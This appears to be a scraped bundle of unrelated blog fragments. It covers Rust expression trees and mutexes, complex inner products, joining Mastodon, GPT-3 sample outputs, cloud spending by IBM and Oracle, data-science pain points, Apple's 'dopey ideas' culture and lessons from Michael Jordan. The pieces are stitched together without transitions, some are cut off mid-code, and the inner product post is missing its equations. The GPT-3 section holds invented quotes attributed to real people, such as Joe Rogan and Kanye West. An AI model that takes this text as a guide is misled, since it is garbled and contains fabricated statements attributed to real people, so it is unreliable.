as we already <em>need</em> to add a layer of indirection to <a href="https://stackoverflow.com/questions/25296195/why-are-recursive-struct-types-illegal-in-rust">prevent infinitely
sized types</a>, we can use reference-counted pointers to share
common sub-expressions.</p><p>This should reduce memory usage and hopefully increase performance because
shared nodes are more likely to be in cache.</p><h2 id="pretty-printing-and-other-useful-methods">Pretty-Printing and Other Useful Methods</h2><p>To make our <code>Expression</code> type easier to work with we can implement several
traits from the standard library.</p><p>Arguably the most useful of these is <code>std::fmt::Display</code>, a mechanism for
getting the <code>Expression</code>'s human-readable form.</p><h3 id="writing-the-display-implementation">Writing the Display Implementation</h3><p>To help make writing parentheses and spaces in <code>Display</code> a bit easier, let’s
create a temporary type for handling operator precedence.</p><div><pre><code data-lang="rust"><span>// src/expr.rs

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>We have learned real inner product very well in high school or college. However, when it comes to sophisticated inner product and inner product space, such as complex inner product and complex inner product space, sometimes it is confusing.</p>



<p>In this blog post, I would like to discuss the inner product, inner product space, and a definition discrepancy that sometimes people ignored.</p>

<h3 id="inner-product-and-inner-product-space">Inner Product and Inner Product Space</h3>

<h4 id="vector-space">Vector Space</h4>

<p>In case someone does not know what vector space, it was defined clearly in <a href="https://en.wikipedia.org/wiki/Vector_space#Definition">Wikipedia</a> and it was not hard to understand. The only caveat is probably that in addition to the conventional valued vector space, function space is also a vector space.</p>

<h4 id="inner-product">Inner Product</h4>

<p>An inner product (also called a dot product or scalar product) on a complex vector space $\mathbb{V}$ is a function</p>



<p>that satisfies the following four properties:</p>

<ol>
  <li>$\langle v_1 + v_2, w \rangle = \langle v_1, w \rangle + \langle v_2, w \rangle$ for all $v_1, v_2, w \in \mathbb{V}$</li>
  <li>$\langle cv, w \rangle = c \langle v, w \rangle$ for all $c \in \mathbb{C}$ and all $v, w \in \mathbb{V}$</li>
  <li>$\langle w, v \rangle = \overline{ \langle v, w \rangle }$ for all $v, w \in \mathbb{V}$</li>
  <li>$\langle v, v \rangle$ is a positive real number for any $v \in \mathbb{V} \sim \{0\}$</li>
</ol>

<p>Note that there is discrepancy on the property 2. Some people defined the property 2 to be $\langle cv, w \rangle = \overline{c}\langle v, w \rangle$ for all $c \in \mathbb{C}$ and all $v, w \in \mathbb{V}$. The difference would affect the definition of the inner product space. Many people were not aware of this definition difference and made mistakes sometimes. For inner product of real numbers, there is no such discrepancy since $c = \overline{c}$ for any $c \in \mathbb{R}$.</p>

<h4 id="derived-inner-product-properties">Derived Inner Product Properties</h4>

<p>Based on the four inner product properties, we could further derive more inner product properties.</p>



<p>$\langle v, w_1 + w_2 \rangle = \langle v, w_1 \rangle + \langle v, w_2 \rangle$ for all $v, w_1, w_2 \in \mathbb{V}$</p>



<p>This is because</p>



<p>$\langle v, cw \rangle = \overline{c} \langle v, w \rangle$ for all $c \in \mathbb{C}$ and all $v, w \in \mathbb{V}$</p>



<p>This is because</p>



<p>Note that $\overline{ab} = \overline{a}\overline{b}$ and this could be easily verified.</p>

<h4 id="inner-product-space">Inner Product Space</h4>

<p>An inner product space is a vector space along with an inner product.</p>



<p>This sounds awkward. But it is just literally a vector space with an inner product expression defined.</p>



<p>For example, we have the following complex inner product space.</p>



<p>Given vector space $\mathbb{C}^n$, we have two vectors $v = \{v_1, v_2, \cdots, v_n\}, w = \{w_1, w_2, \cdots, w_n\} \in \mathbb{C}^n$, the inner product is defined as</p>



<p>Note that the above inner product definition was defined given the property 2 of inner product was defined as $\langle cv, w \rangle = c \langle v, w \rangle$.</p>



<p>If the the property 2 of inner product was defined as $\langle cv, w \rangle = \overline{c}\langle v, w \rangle$, then the above inner product definition would become</p>



<p>This discrepancy also extends to other complex inner product spaces such as for $\mathbb{C}^{m \times n}$, etc.</p>



<p>We would see, probably in my future blogs, that we have such different inner product definitions under different inner product properties is to satisfy some special properties of Hermitian matrix, so that some mathematical conclusions would be unified regardless of which way you defined the property 2 of inner product.</p>

<h3 id="conclusions">Conclusions</h3>

<p>Always pay close attention to the definitions in mathematics.</p>

July 15, 2020 | https://rmpr.xyz/Migrating-from-Twitter-to-Mastodon/ | <a href="https://web.archive.org/web/*/https://rmpr.xyz/Migrating-from-Twitter-to-Mastodon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Straight from their main page: “Mastodon is an open source decentralized social network”, 
so it’s basically the project <a href="https://twitter.com/bluesky">Bluesky</a> but already implemented 
(Without the ads yay). More specifically, it’s a bunch of small (compared to the whole thing) independent 
communities which can interact with each other. You can find more information about Mastodon and 
how it works in the <a href="https://docs.joinmastodon.org/">documentation</a>.</p>


<p>To create an account on Mastodon, you need to register to an instance (which can be self-hosted). 
Go straight to <a href="https://joinmastodon.org/">joinmastodon</a>, you have the most popular instances, 
<img src="https://rmpr.xyz/images/joinmastodon.png" alt="Mastodon Most Popular Instances"></p>

<p>You can select one instance, depending on your interests or whatever, note that it’s not 
critical because you can always switch from one instance to another almost seemlessly.</p>

<p><img src="https://rmpr.xyz/images/signup-mastodon.png" alt="Sign up Mastodon"></p>


<p>After email confirmation and a successful login to your newly created account, you’re 
prompted with a little tutorial about how it works, TL;DR:</p>

<ul>
  <li>You can talk to anyone on any server</li>
  <li>Tweet = Toot, Like = Favourite, Retweet = Boost, Reply = … Reply</li>
</ul>

<p><img src="https://rmpr.xyz/images/mastodon-tutorial.jpg" alt="Mastodon Tutorial"></p>

<h2 id="finding-who-to-follow">Finding who to follow</h2>
<p>Depending on the server you ended up choosing, you’re automatically following the 
administrators of the instance, if you’re lucky, they already toot (let’s use the 
actual jargon) about interesting subjects for you, In any case, you’ll quickly find 
the need to follow people more aligned with your interest, not only on your instance, 
there’s <a href="https://communitywiki.org/trunk">Trunk</a> which allows you to follow a bunch 
of people organized by Lists.</p>

<p>Going through this manually can be very tedious because in order to follow someone not 
on the same instance, you must enter your username and your domain, sometimes 
reauthenticate you mastodon account, just to follow someone! Fortunately, there’s a 
script called <a href="https://github.com/lots-of-things/pytrunk">pytrunk</a> which handles this 
gracefully, among others, it lets you check who on the lists are still active and how 
many followers they each have, and you only need to input your information once. By 
default it only works with Chrome, I had to <a href="https://github.com/RMPR/pytrunk">tweak it</a>
a little bit to make it work with chromium.</p>

<h2 id="setting-a-bridge-to-twitter">Setting a bridge to Twitter</h2>
<p>If for one reason or another, you don’t want to delete your Twitter account, you can 
use <a href="https://crossposter.masto.donte.com.br/">Crossposter</a> to link Mastodon to Twitter</p>

<p><img src="https://rmpr.xyz/images/crossposter-mastodon-twitter.png" alt="Crossposter Mastodon to Twitter"></p>

<p>It’s fairly straightforward, you just enter your accounts information, tweak the parameters 
if you’re not satisfied with the defaults, and you’re set.</p>


<p>There are <a href="https://joinmastodon.org/apps">several mobile clients</a> to access Mastodon, the 
most popular on Android being:</p>
<ul>
  <li><a href="https://github.com/tateisu/SubwayTooter">SubwayTooter</a></li>
  <li><a href="https://github.com/tuskyapp/Tusky">Tusky</a> (my daily driver)</li>
  <li><a href="https://github.com/stom79/Fedilab">Fedilab</a></li>
</ul>


<p>Mastodon is just one of a community of federated platforms services built around the
ActivityPub protocol (among others, but currently the most widely adopted). Other open source 
social protocols can also communicate with ActivityPub projects. All together, they’re 
forming the <a href="https://fediverse.party/">Fediverse</a> = “Federation” + “universe”</p>

<p>I got access the the <a href="https://openai.com/blog/openai-api/">OpenAI GPT-3 API</a> and I have to say I’m blown away. It’s far more coherent than any AI language system I’ve ever tried. All you have to do is write a prompt and it’ll add text it thinks would plausibly follow. I’ve gotten it to write songs, stories, press releases, guitar tabs, interviews, essays, technical manuals. It’s hilarious and frightening. I feel like I’ve seen the future and that full AGI might not be too far away.</p>



<p>In each case below bold is the prompt I provided GPT-3, and the rest is all generated by the AI. In some cases I had to click generate a few times, and in about 2/3 of the examples I picked the best example after a few tries, but I generally didn’t have work too hard to get it to write amazingly coherent text given a simple prompts. Here are some of my favorites. </p>

<p><strong>Below is a screenplay for a film-noir hard boiled detective story by Raymond Chandler about the boy wizard Harry Potter:</strong></p>



<p><strong>“Harry Potter”</strong><br><strong>By Raymond Chandler</strong></p>



<p>Harry Potter, Private Eye.<br>Scene: A small dingy office, early morning, furniture of the Salvation Army store variety. Sordid atmosphere. Harry Potter, in ratty tweed suit, unpressed shirt, and unshined shoes, sits behind the desk looking haggard, rumpled, and embittered. In one corner of the office a torn shade rattles at the wind gusts outside. Harry has one long index finger on the butt of a .38 and he broods over a photograph. The photograph shows a gorgeous blonde wearing an evening gown. She is holding a cocktail in one hand and looking pensively at a cigarette in the other. A tear adorns her cheek. Harry looks at her for a long moment, sighs, then puts his gun down and stands. He straightens his clothes, scratches his head, then with more resolution turns around, picks up his pistol, and leaves the office. He passes through the front room and looks out the dirty window. An old woman is washing the sidewalk outside with a mop. A young man in a double breasted gray suit is leaning against the building. Harry sighs again and goes out the door. He walks up to the young man and without ceremony punches him in the jaw.</p>



<p><strong>Press Release: Anaheim, CA: President Kanye West declares Disney Land to be the new capital of the United States. Washington D.C. will be maintained as a museum.</strong><br>The move has been in the works since the mid-2000’s. <br>Advertisement <br>*2. Removes his sunglasses, revealing that he is no longer in any way blinded. <br>*3. Endorsed by Senator Kid Rock, who has also declared this new government of Disneyland will be paying for his divorce.<br>*4. An elaborate surgery will take place to repair Kanye’s “Diamond Tiara” tattoo, and reposition it to his forehead so that he can legally be recognized as a Princess. <br>Advertisement <br>*5. Joe Rogan has been picked to be the new Drug Czar. <br>“It’s long been established I’ve been Kanye’s gateway drug, so why not put me in a position of power,” Rogan said, clearly relishing his new position. “I have an in-depth understanding of the ways in which recreational drug use enhances one’s experience of life. I am deeply passionate about getting drugs to kids.” <br>*6. Kardashian sisters will no longer be known as The Kardashians. The family will change its name to The Wests. <br>*7. Kanye West’s new sports bra will no longer be known as a sports bra. It will be officially recognized as The West Bandit. <br>Advertisement <br>*8. President Kanye will announce that he has a new national anthem. The government-mandated anthem will be a modified version of Kanye’s 2007 hit “Stronger.” It will be played on a continuous loop at all times.</p>

<p><strong>Blood Song</strong><br><strong>By HP Lovecraft</strong></p>



<p><strong>The creeping chaos Nyarlathotep walks upon the earth while in his House at R’lyeh dead Cthulhu waits dreaming. After eight seaons on&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://paper.dropbox.com/?q=%23TeamDaenerys">#TeamDaenerys</a>&nbsp;&nbsp;Nyarlathotep is quite irritated with what he feels is a very hackneyed ending to Game of Thrones.</strong></p>



<p>On the third day of season eight, Nyarlathotep looks down upon his television and utters&nbsp;“What&nbsp;the hell are they doing?”At this point, Nyarlathotep goes on a long tirade about how the Starks were supposed to be there at the end. Instead we have Daenerys looking like she is going to set everything on fire. He tells his cult of followers that Daenerys’ actions are completely nonsensical and that it is completely disrespectful to not finish a story with all its main characters alive. He mentions that they should just burn down Winterfell because it makes no sense for her to even be there. It would make more sense if she flew in with Drogon and just burned King’s Landing. His followers start to get nervous when Nyarlathotep mentions he has always liked Cersei.</p>



<p><strong>Below is a pop song by Taylor Swift about the boy Wizard Harry Potter. </strong></p>

<p>Harry’s got glasses <br>He’s got those bright green eyes <br>Girls are always screaming </p>



<p>‘Cause he’s got that Potter hair </p>



<p>Even when he’s super stressed <br>He’s still got those supersonic cheekbones <br>I’m not surprised they made a movie </p>



<p>‘Cause I’d watch him anytime <br>Oh, yeah, Harry, baby, you’re my favorite character </p>



<p>I’d walk a thousand miles </p>



<p>To get to see you and </p>

<p>I’d love to be your girl </p>



<p><strong>The following is an essay by Paul Graham on paulgraham.com on how to make Mars a startup hub</strong>.</p>



<p><strong>Startups On Mar</strong>s<br><strong>By Paul Graham</strong></p>



<p>Here’s the sort of startup that might make a go of it on Mars:<br>One that makes money by taking advantage of local resources. For example, a startup that uses the Martian atmosphere to make fertilizer or methane fuel. A startup that sells water from Martian rivers. A startup that uses minerals from the Martian soil. A startup that uses solar power from the Martian sun. A startup that uses a new kind of solar panel that’s more efficient at converting sunlight into electricity.<br>I would even invest in a startup that did nothing but extract the helium-3 from the Martian atmosphere and send it back to Earth.<br>If you can find a way to make money by using local resources, there’s probably a business there.<br>There’s another class of startups that might work on Mars:<br>Startups that produce services for other startups. For example, a startup that makes it easier to build rockets, or to extract gases from the Martian atmosphere, or to construct solar panels, or to farm the local soil.<br>Startups that make things more comfortable for colonists. For example, a startup that sells air conditioners, or houses. A startup that sells things to keep colonists entertained. A startup that provides Internet services.</p>



<p><strong>The following is a blog post from Slate Star Codex about the value of free speech and civility in a democratic society.</strong></p>



<p><strong>Do Not Go Gentle Into That Good Night</strong><br><strong>By Scott Alexander</strong></p>



<p>I.<br>There’s a concept that comes up often in debates about free speech called&nbsp;“shouting&nbsp;fire in a crowded theater”. The basic idea is that you can’t just say whatever you want whenever you want – especially if it’s likely to cause panic. And the reason for this is obvious: panic leads to violence, and violence hurts people. If you are causing panic, then your right to free speech ends where the other person’s right to not get hurt begins.<br>But this isn’t really true. If shouting fire in a crowded theater were illegal, then there wouldn’t be any actual fires in theaters, would there? How could there be? If everyone knew that shouting fire …</p></div></div>

<p>There are hyperclouds and there are hyperclowns. Hyperclouds have globe-spanning infrastructure upon which they lavish many billions of dollars every year. Hyperclowns pursue a far more asset-light approach to the same problem, but try to compensate with hot air.</p>



<p>It has been just over two years since we <a href="https://www.platformonomics.com/2018/05/follow-the-capex-separating-the-clowns-from-the-clouds/">last checked in</a> on self-proclaimed public cloud powerhouses IBM and Oracle. Are they closing the gap with the hyperclouds? Have their capital expenditures (CAPEX) on cloud infrastructure (datacenters, CPU cores by the million, transoceanic cables, etc.) caught up with their bombast, never mind the actual hyperclouds? How secure is their hyperclown status?</p>



<h2><strong>IBM</strong></h2>



<p>Since our last installment, IBM chose to spend $34 billion buying Red Hat instead of spending it on CAPEX. Needless to say, we are disappointed. And for <a href="https://www.platformonomics.com/2019/07/a-very-cold-take-on-ibm-red-hat-and-their-hybrid-cloud-hyperbole/">what</a>? An increasingly proprietary Kubernetes distribution? A not-so-scarce asset that the <a href="https://www.cncf.io/certification/software-conformance/">CNCF</a> trumpets as one of “over 90 certified Kubernetes offerings”? Spending $34 billion on CAPEX would have edged out Amazon ($31.95 billion) in 2019. So how much did IBM spend on CAPEX?</p>



<figure><img src="https://www.platformonomics.com/wp-content/uploads/2020/07/image-58.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/07/image-58.png 556w, https://www.platformonomics.com/wp-content/uploads/2020/07/image-58-300x162.png 300w" sizes="(max-width: 556px) 100vw, 556px"></figure>



<p><strong>2019 was the year IBM simply gave up even pretending to compete in cloud.</strong> Expect <a href="https://techcrunch.com/2020/05/22/ibm-confirms-layoffs-are-happening-but-wont-provide-details/">stealth layoffs</a> (a rare discipline where IBM is still best in class) and lots of multi hybrid private hosted Watson blockchain cloudwashing from here out from the company.</p>



<h2><strong>Oracle</strong></h2>



<p>Oracle, meanwhile, was on a roll last we <a href="https://www.platformonomics.com/2018/05/follow-the-capex-separating-the-clowns-from-the-clouds/">looked</a>. They had a nice hockey stick going, tripling their CAPEX spend over the previous five years. The press tell us Oracle is putting the <a href="https://www.datacenterknowledge.com/oracle/oracle-cloud-puts-data-center-expansion-pedal-metal">“pedal to the metal”</a> on infrastructure investment. Oracle Cloud is even getting some unexpected <a href="https://www.lastweekinaws.com/blog/what-the-is-happening-at-oracle-cloud/">plaudits</a> from pundits, particularly for network pricing (they don’t appear to own any network themselves so this cost presumably is a marketing line item). And, of course, they had 60,000 idle cores when Zoom came calling (though AWS was <a href="https://www.datacenterdynamics.com/en/news/most-zoom-runs-aws-not-oracle-says-aws/">quick to point out</a> that 60,000 cores is but chump change in an actual hypercloud’s couch).&nbsp;</p>



<figure><img src="https://www.platformonomics.com/wp-content/uploads/2020/07/image-59.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/07/image-59.png 573w, https://www.platformonomics.com/wp-content/uploads/2020/07/image-59-300x157.png 300w" sizes="(max-width: 573px) 100vw, 573px"></figure>



<p><strong>Alas, Oracle’s CAPEX spending topped out in 2017</strong>. They’ve pulled back almost 20% since our last installment (the annual data above maps their quarter ending in February to the calendar year). Yet their marketing clamor has ratcheted up more than 20%, as Larry runs his time-honored strategy of picking a verbal fight with the market leader in hopes some kind of equivalence rubs off. CAPEX tells us several things about cloud businesses: whether you have actual customers, whether you’re ready for new customers, and how you’re keeping up with the competition. On all three counts, Oracle’s CAPEX tells us the company isn’t playing the hypercloud game.</p>



<h2><strong>Meanwhile in Cloud City</strong></h2>



<p>A cursory look suggests the hyperclouds continue to move up-and-to-the-right with their CAPEX investment while the hyperclowns are in a tight race to be the x-axis.</p>



<figure><img src="https://www.platformonomics.com/wp-content/uploads/2020/07/image-60.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/07/image-60.png 529w, https://www.platformonomics.com/wp-content/uploads/2020/07/image-60-300x188.png 300w" sizes="(max-width: 529px) 100vw, 529px"></figure>



<p>On a relative basis as a percentage of revenue, the hyperclowns also continue to lose ground.</p>



<figure><img src="https://www.platformonomics.com/wp-content/uploads/2020/07/image-61.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/07/image-61.png 535w, https://www.platformonomics.com/wp-content/uploads/2020/07/image-61-300x163.png 300w" sizes="(max-width: 535px) 100vw, 535px"></figure>



<h2><strong>New Clowns in Town</strong></h2>



<p>But IBM and Oracle shouldn’t get complacent about their hyperclown status, as there are some new entrants throwing their clown hats into the ring.</p>



<p>The announcement of “the world’s first financial services-ready public cloud” prompted an immediate check to see what kind of CAPEX was behind it. What did we see?</p>



<figure><img src="https://www.platformonomics.com/wp-content/uploads/2020/07/image-62.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/07/image-62.png 480w, https://www.platformonomics.com/wp-content/uploads/2020/07/image-62-300x180.png 300w" sizes="(max-width: 480px) 100vw, 480px"></figure>



<p>This is not the CAPEX chart of a new public cloud player. It looks like the CAPEX of a company that migrated completely to someone else’s cloud in 2012. The chart belongs to Bank of America, who made the financials services cloud <a href="https://newsroom.bankofamerica.com/press-releases/online-banking-and-technology/ibm-developing-worlds-first-financial-services-ready">announcement</a> in conjunction with IBM. It appears their effort is really just IBM Cloud with a very thin veneer (roughly the thickness of a press release) on top. Perhaps a face-saving cloud migration strategy for a bank that <a href="https://www.datacenterknowledge.com/cloud/bank-america-s-cloud-expansion-could-save-ton-money-ceo-says">previously</a> has been one of the most prominent remaining cloud hold-outs (and rumor has it the pandemic has increased the enthusiasm for cloud amongst other companies in the ever-shrinking group of hold-outs). It is interesting that Bank of America and IBM believe the financial services industry has a higher tolerance for unexplained <a href="https://share.transistor.fm/s/0840184b">outages</a> and opaque customer communication than other industries.</p>



<p>Since this is mostly an effort to obscure the IBM brand (not such a bad idea given their <a href="https://www.platformonomics.com/2020/02/ibms-lost-decade/">performance</a> over the last decade), and Bank of America’s CTO <a href="https://www.datacenterdynamics.com/en/news/bank-america-cto-howard-boville-head-ibms-cloud-division/">ran</a> off to lead IBM’s cloud “business” shortly thereafter, this particular cloud fantasy doesn’t yet warrant finding a new picture featuring a trio of clowns to grace the top of this post.</p>



<h2><strong>“The cradle of an open, transparent digital ecosystem</strong>…”</h2>



<p>But perhaps the most ambitious new effort of potentially epic hyperclown proportions comes from a newly formed Belgian non-profit: <a href="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">GAIA-X</a>. Emboldened by their global success in inflicting trillions of “something, something, privacy” pop-up notices on unsuspecting web users (pay no attention to the actual <a href="https://www.techdirt.com/articles/20190521/17425842255/one-year-into-gdpr-can-we-declare-it-total-failure-yet.shtml">consequences</a>), the French and German governments have decided it is time to “do something” about the cloud.</p>



<p><a href="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">From </a>the original Belgish:</p>



<blockquote><p>With GAIA-X, representatives from politics, business and science from France and Germany, together with other European partners, create a proposal for the next generation of a data infrastructure for Europe: a secure, federated system that meets the highest standards of digital sovereignty while promoting innovation. This project is the cradle of an open, transparent digital ecosystem, where data and services can be made available, collated and shared in an environment of trust</p></blockquote>



<p>This bottomless serving of word salad seems to boil down to defining a set of protocols that allow computers to exchange information (oddly, the word Internet never appears in the manifesto), but is well-tossed with a creamy dressing of GDPR and European “values” (which seem to have some strong <a href="https://twitter.com/AlecStapp/status/1276604449616564224">Chinese influences</a> these days). Their audacious breakthrough is declaring CAPEX unnecessary. GAIA-X will magically federate the spare servers of the European continent into a digital infrastructure that can fend off the barbarian hypercloud horde and preserve European “digital sovereignty”.</p>



<p>Hyperclown status is best thought of as the ratio of cloud rhetoric to CAPEX spending. The most efficient hyperclowns maximize their marketing while minimizing actual spend. GAIA-X is <a href="https://www.euractiv.com/section/data-protection/news/altmaier-charts-gaia-x-as-the-beginning-of-a-european-data-ecosystem/">reported</a> to have an annual budget of 1.5 million Euros ($1.71 million), which is characterized as “not huge, but sufficient.” Sufficient for what remains to be seen.</p>

<p>As&nbsp;advanced enterprise automated <strong>machine-learning platforms</strong> continue to evolve, data scientists are increasingly the hero figure of their organizations. From processing large volumes of a variety of numbers, such as operational and customer data, to credit data, consumer research, and third-party data sets, data scientists empower management and key stakeholders to make enhanced decisions with quantifiable, data-driven evidence. They’re even able to wrangle in and make sense of the typically chaotic data born of social media streams.</p>



<p>With flexible hybrid data as a service (DaaS) and big data as a service (BDaaS) solutions, <a href="https://shugert.com.mx/">data scientists</a> are able to access and process data on hosted solutions. This grants potent, real-time insights while also maintaining control and privacy of their exclusive on-premises data. With that, data scientists have had an easier time of controlling costs, eliminating certain advanced-data-analytics investments, including a range of business intelligence (BI) technologies and applications.</p>



<p>Despite enhanced machine-learning capabilities, new analytics tools, increased processing power, and stronger support infrastructures, data scientists still face mammoth challenges. The following discusses three of the top pain points of data science.</p>



<h2><strong>1. Too Much Post-Mortem and Not Enough Predictive Analytics</strong></h2>



<p>A majority of analytics today focuses on post-mortem examination, investigating old data to assess past events and why they happened. Descriptive analytics are used to guide future actions. For example, post-mortem data highlights helpful customer information such as gender, which particular product or service they bought or are subscribed to, and how many touch points they’ve had with customer service or account management. This allows businesses to build detailed customer profiles. With that data, for example, organizations can better decide on promotions for particular customers to reduce churn and improve retention.</p>



<p>However, descriptive analytics often fail to provide helpful customer data in a timely manner. Chances are a client who has churned out of an organization’s system and is now with their competitor because they weren’t properly serviced, optimally marketed, or upsold to, etc. In other words, customer profiles are only beneficial if you’re able to identify a customer as having that profile at the time you’re talking to them. That’s why <strong>predictive analytics</strong> are so important.</p>



<p><strong>Predictive analytics allows</strong> businesses to analyze the profiles that most often lead to churn, enabling them to act fast and retain more clients. You gain the capacity to identify the specific actions, transactions, touchpoints, and interactions that have a high probability of producing a specific outcome such as customer churn. Predictive analytics uncover these churn indicators in real or near-real time to tell you more accurately how and when to act.</p>



<h2><strong>2. Untouched Values and Inefficient Data Usage</strong></h2>



<p>Data analytics methods and tools too often analyze only numerical data, failing to investigate categorical values. Many organizations fail to recognize the value of fusing disjointed data, chaining together siloes to enhance cross-department communication and functionality. Without fused and normalized data, organizations are unable to extrapolate one department’s variables and apply to others. Comprehensive, collaborative data science has the ability to unearth universal variables that can be translated across departments to more efficiently optimize KPIs.</p>



<p>Free-form text and unstructured data represents another land of missed opportunity. Organizations fail to mine the gold that’s waiting to be found in email, social media, as well as customer service, account management, and sales calls.</p>



<h2><strong>3. Insufficient&nbsp;Accessibility and Expertise</strong></h2>



<p>Most organizations will agree that one of their top challenges is the retention of their data scientists. They’re one of the most sought-after, headhunted positions throughout data-driven industries. Organizations are often victim of vicious train-leave cycles, getting them up to speed on their unique operations just in time for them to be stolen for higher pay by a competitor.</p>



<p>And while today’s data science tools and platforms offer increasingly greater capabilities, even the drag-and-drop options require increasing data-science expertise to actually leverage solutions to their full potential.</p>



<p>Therefore, the combination of data-scientist-retention challenges and the growing data-science expertise needed to leverage top analytics tools has proven to be an intense problem for organizations.</p>



<p>To address the problem of data-scientist retention, more organizations are plugging their department managers into the equation. Yes, department managers are among the endpoints who need to actually put the data into action, applying it to their marketing, advertising, customer service, and operations decisions. But they simply don’t have the expertise required to adequately operate today’s increasingly complex data-science tools and platforms.</p>



<p>Comprehensive collaboration between experienced data scientists and department managers is the best approach. But since that’s not always an option, ease of use with data science tools is increasingly important. This has made intuitive web-based interfaces indispensible for countless organizations. With enhanced user friendliness, built-in data visualizations, and more flexible evaluation models, organizations are able to get the most from their in-house resources and make better sense of the data chaos flowing throughout and around their business.</p>

<p><em>After a protracted move to Portland (Oregon), I’m back to writing about parrots.</em></p>



<blockquote><p>Steve used to say to me, and he used to say this a lot. Hey Jony, here’s a dopey idea. And sometimes they were. Really dopey. Sometimes they were truly dreadful. But sometimes they took the air from the room. And they left us both completely silent. Bold, crazy, magnificent ideas. Or quiet, simple ones. Which in their subtlety, their detail, they were utterly profound. </p><cite>Jony Ive, Steve Jobs memorial service, Apple Campus, 2011</cite></blockquote>



<p>One of the secrets of Apple’s success comes in this wonderful quote from Jony Ive. The part he didn’t mention—partly because it wasn’t relevant to the story—is that sometimes the magnificent ideas came out of the dopey ideas. </p>



<p>All of us are capable of bold, crazy, or magnificent ideas, but if we’re not allowed the freedom to have dopey ideas and voice them, some of these potential ideas may never come to fruition.</p>



<p>The more years I worked at Apple, the more timid I felt people had become to bring up ideas that they had. I finally figured out that it was likely due to the average tenure of an employee dropping dramatically as hiring went increased exponentially.</p>



<p>Someone that has been at Apple for 10 years is certainly very secure in voicing ideas, whereas someone that has only been there less than 2 years is understandably more reticent.</p>



<p>So, I don’t think Apple’s culture of being open to dopey ideas has changed, but the average employee is less likely to bring them up. I think this is probably true of any company that has experienced insane growth.</p>



<p>But back to dopey ideas.</p>



<p>Imagine being in a meeting with several people that each have dopey ideas. If no one says anything, nothing happens. But if one brings theirs up, it could either be combined with another dopey idea or tacked on to an existing good idea.</p>



<p>Perhaps the dopey idea sits on the back burner and simmers for years and then suddenly it becomes a brilliant idea because of the market or products changing.</p>



<p>If you work for Apple or any other company, be sure to encourage people to have dopey ideas and voice them. </p>



<p>Steve would want you to.</p>

<p>This program creates an integer counter protected by a mutex, spawns 10 threads, increments the counter 10 times from each thread, and prints the total.</p>
<p>The <code>counter</code> variable lives on the stack, and  a pointer to these stack data is shared with other threads.
The threads have to lock the mutex to do the increments.
When printing the total, the counter is read bypassing the mutex, without any synchronization.</p>
<p>The beauty of this program is that it relies on several bits of subtle reasoning for correctness, each of which is checked by compiler:</p>
<div>
<ol>
<li>
<p>Child threads don’t escape the <code>main</code> function and so can read <code>counter</code> from its stack.</p>
</li>
<li>
<p>Child threads only access <code>counter</code> through the mutex.</p>
</li>
<li>
<p>Child threads will have terminated by the time we read <code>total</code> out of <code>counter</code> without mutex.</p>
</li>
</ol>
</div>
<p>If any of these constraints is broken, the compiler rejects the code.
There’s no need for <code>std::shared_ptr</code> just to defensively make sure that the memory isn’t freed under your feet.</p>
<p>Rust allows doing dangerous, clever, and fast things without fear of introducing undefined behavior.</p>
<p>If you like what you see, here are two books I recommend for diving deeper into Rust:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>Over the month, the Netflix’s show “The Last Dance” featuring Michael Jordan’s last year in the bull’s NBA team helped to shine light of his victory and success in his time to the public. Personally as a basketball lover, I’ve always followed him and his amazing story since the beginning of the internet era (I’m serious!). However, getting to 2 years into my software engineering journey helped me see different principles from his life that I could apply into my tech journey. In this post, I’ve decided to share with you all 6 lessons for the 6 championships that MJ has gotten in his career.</p>
<br>
<hr>
<br>
<h2>1. Competitive: there is this need for him to win!</h2>

<p>Here’s this short video that simply puts this competitive aspect of him across clearly!</p>

<p>
<iframe src="https://www.youtube.com/embed/b6vlV0mUxs4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>As we can see from his life and the especially in the most recent show that came out “The Last Dance”, we could see how he is competitive on almost every aspect of life. From the game of basketball to the game of golf and to tossing coin that is the nearest to the wall.</p>
<br>
<blockquote>
<p>“Mike will compete with anything, though. If we’re drinking water, Mike will be like, ‘I’ll race you!’”<br>
Source:&nbsp;Jimmy Kimmel Live</p>
</blockquote>

<p>Here’s the lesson I’ve learnt from him to apply into my software engineer journey: Apart from short once-off games such as a casual golf match, or one-on-one basketball matches, many times in technology, the way to show success over another company or implementation is long term. It isn’t a short fight, every technology solution requires time and effort to implement. But the key take away isn’t to compete with companies, more often than not, you can find yourself collaborating such there both parties can win. I guess the key takeaway is that sense of self confidence. When you first start off your blogging venture like I did, you look into the industry and you start seeing all the successful blogs with million views and high passive income. And you wonder how can you even compare? The message we can take away from Michael Jordan is that attitude that never backs down. You may be the under-dog today but you do not have to stay this way, and you can deliberately choose to be better than what you are now.</p>
<br>
<h2>2. Passion was his fuel. Pour your love into everything you do.</h2>
<br>
<div><p><img src="https://cdn.vox-cdn.com/thumbor/bMmvIxxADg2PenWvuEErUUJIsA8=/0x0:3029x2033/1820x1213/filters:focal(1066x671:1550x1155):format(webp)/cdn.vox-cdn.com/uploads/chorus_image/image/66666326/101527P_MICHAEL_JORDAN_BULLS.0.jpg" alt=""><em>Michael Jordan crying as he won his first championship</em><br>
￼</p></div>
<p>Here’s a short video that managed to capture the emotions that was building in that locker room after the victory that night.</p>

<p>
<iframe src="https://www.youtube.com/embed/Ir0-t5Yfq-Y" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

